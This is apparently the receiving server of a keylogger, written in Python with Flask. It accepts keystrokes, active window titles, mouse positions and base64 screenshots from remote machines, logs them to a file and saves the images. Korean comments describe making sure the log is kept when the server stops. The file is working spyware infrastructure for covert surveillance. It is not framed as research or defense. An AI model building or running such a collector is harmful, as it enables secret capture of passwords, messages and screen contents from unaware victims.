from flask import Flask, request

import atexit
import base64
import time
import io


app = Flask(__name__)


@atexit.register
def save_log():
    with open('./log.txt', 'at') as f: 
        f.write(output.getvalue())

    output.close()


def save_photo(file_name, photo_bytes):
    with open(file_name, 'wb') as f: f.write(photo_bytes)

    
@app.route('/info', methods=['POST'])
def info():
    form = request.form

    try:
        print(f'time: {form["time"]} | m_position: {form["m_position"]}', file=output)

        if 'screenshot' in form.keys():
            save_photo(
                f'./screenshot/{form["time"]}.png'.replace(':', '_'),
                base64.b64decode(form['screenshot'])
            )
        else:
            print(f'\tactive_win: {form["active_win"]} | key: {form["key"]}', file=output)

        return '', 200
    except: return '', 500


if __name__ == '__main__':
    output = io.StringIO()
    
    app.run(debug=True, host='0.0.0.0', port=4444)

# 처음에는 이걸 쓰레드를 나눠서 한 쓰레드에서 10초마다 log가 차있다면 저장을 시키고 log를 비웠는데 너무 코드가 복잡
# 스트림이란 것을 이용함
# 이걸 이용하니 갑자기 종료됐을 때 저장이 안 됨
# atexit을 찾음
# 이게 Ctrl+C로 종료되도 atexit이 실행되는데 파워쉘이나 cmd에서 Ctrl+break로 종료하면 실행이 안 됨.